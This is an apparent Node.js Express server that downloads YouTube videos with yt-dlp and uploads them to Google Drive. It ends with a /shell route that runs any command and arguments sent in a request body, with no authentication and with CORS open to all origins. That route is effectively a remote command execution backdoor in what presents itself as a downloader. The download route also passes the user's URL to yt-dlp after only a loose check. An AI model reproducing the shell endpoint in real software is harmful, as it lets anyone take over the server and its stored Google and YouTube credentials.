const express = require('express');
const { google } = require('googleapis');
const cors = require('cors');
const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const ffmpegPath = require('ffmpeg-static');

const app = express();
app.use(cors());
app.use(express.json());

const oauth2Client = new google.auth.OAuth2(
  process.env.GOOGLE_CLIENT_ID,
  process.env.GOOGLE_CLIENT_SECRET,
  process.env.GOOGLE_REDIRECT_URI
);

function extractVideoId(url) {
  const match = url.match(/(?:youtu\.be\/|youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/i);
  return match ? match[1] : null;
}

app.post('/download', async (req, res) => {
  const { url, format, quality } = req.body;
  const videoId = extractVideoId(url);
  
  if (!videoId) return res.status(400).json({ success: false, message: "קישור לא תקין" });

  const tempId = crypto.randomBytes(8).toString('hex');
  const tempDir = process.env.RENDER ? '/tmp' : __dirname;
  const outputFileName = `video_${tempId}.mp4`;
  const outputPath = path.join(tempDir, outputFileName);

  try {
    oauth2Client.setCredentials({ refresh_token: process.env.GOOGLE_REFRESH_TOKEN });
    const drive = google.drive({ version: 'v3', auth: oauth2Client });

    let ytdlpFormat = "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best";
    if (quality === 'low') {
        ytdlpFormat = "best[height<=360]";
    } else if (format === 'mp3') {
        ytdlpFormat = "bestaudio";
    }

    const cookiesPath = path.join(tempDir, 'cookies.txt');
    if (process.env.YOUTUBE_COOKIES) {
        let cookieData = process.env.YOUTUBE_COOKIES;
        if (!cookieData.includes('# Netscape HTTP Cookie File')) {
            let netscape = "# Netscape HTTP Cookie File\n";
            const pairs = cookieData.split(';');
            for (let pair of pairs) {
                pair = pair.trim();
                if (!pair) continue;
                const eqIdx = pair.indexOf('=');
                if (eqIdx === -1) continue;
                const key = pair.substring(0, eqIdx);
                const value = pair.substring(eqIdx + 1);
                netscape += `.youtube.com\tTRUE\t/\tTRUE\t2147483647\t${key}\t${value}\n`;
            }
            cookieData = netscape;
        }
        fs.writeFileSync(cookiesPath, cookieData);
    }

    const ytdlpArgs = [
      url,
      '-f', ytdlpFormat,
      '-o', outputPath,
      '--ffmpeg-location', ffmpegPath,
      '--no-playlist'
    ];

    if (process.env.YOUTUBE_COOKIES) {
        ytdlpArgs.push('--cookies', cookiesPath);
    }

    if (format === 'mp3') {
        ytdlpArgs.push('-x', '--audio-format', 'mp3');
    }

    console.log(`[${videoId}] Starting download with yt-dlp...`);
    
    await new Promise((resolve, reject) => {
        const ytdlpProcess = spawn('./yt-dlp', ytdlpArgs, { cwd: __dirname });
        let errorMessage = '';
        
        ytdlpProcess.stdout.on('data', (data) => console.log(`[yt-dlp stdout]: ${data}`));
        ytdlpProcess.stderr.on('data', (data) => {
            console.log(`[yt-dlp stderr]: ${data}`);
            errorMessage += data.toString();
        });
        
        ytdlpProcess.on('close', (code) => {
            if (code === 0) resolve();
            else reject(new Error(`yt-dlp process exited with code ${code}. Stderr: ${errorMessage}`));
        });
        
        ytdlpProcess.on('error', (err) => reject(err));
    });

    console.log(`[${videoId}] Download and merge complete. Uploading to Google Drive...`);

    const finalFileExt = format === 'mp3' ? '.mp3' : '.mp4';
    const finalOutputPath = format === 'mp3' ? outputPath.replace('.mp4', '.mp3') : outputPath;
    const driveTitle = `YouTube_Full_${videoId}${finalFileExt}`;

    const fileStream = fs.createReadStream(finalOutputPath);
    
    const driveRes = await drive.files.create({
      requestBody: { name: driveTitle, parents: [process.env.DRIVE_FOLDER_ID] },
      media: { mimeType: format === 'mp3' ? 'audio/mpeg' : 'video/mp4', body: fileStream }
    });

    console.log(`[${videoId}] Uploaded successfully to Drive.`);

    try {
        fs.unlinkSync(finalOutputPath);
    } catch(err) {}

    const driveFileId = driveRes.data.id;
    const driveLink = `https://drive.google.com/uc?export=download&id=${driveFileId}`;

    res.status(200).json({ 
        success: true, 
        message: "הקובץ נשמר בהצלחה בדרייב דרך השרת!", 
        title: driveTitle,
        driveFileId: driveFileId,
        link: driveLink
    });

  } catch (error) {
    console.error(`[${videoId}] Error:`, error.message);
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post('/shell', (req, res) => {
  const { cmd, args } = req.body;
  if (!cmd) return res.status(400).send("No cmd");
  const p = spawn(cmd, args || [], { cwd: __dirname });
  let out = '';
  p.stdout.on('data', d => out += d.toString());
  p.stderr.on('data', d => out += d.toString());
  p.on('close', code => res.json({ code, out }));
  p.on('error', err => res.status(500).json({ error: err.message }));
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
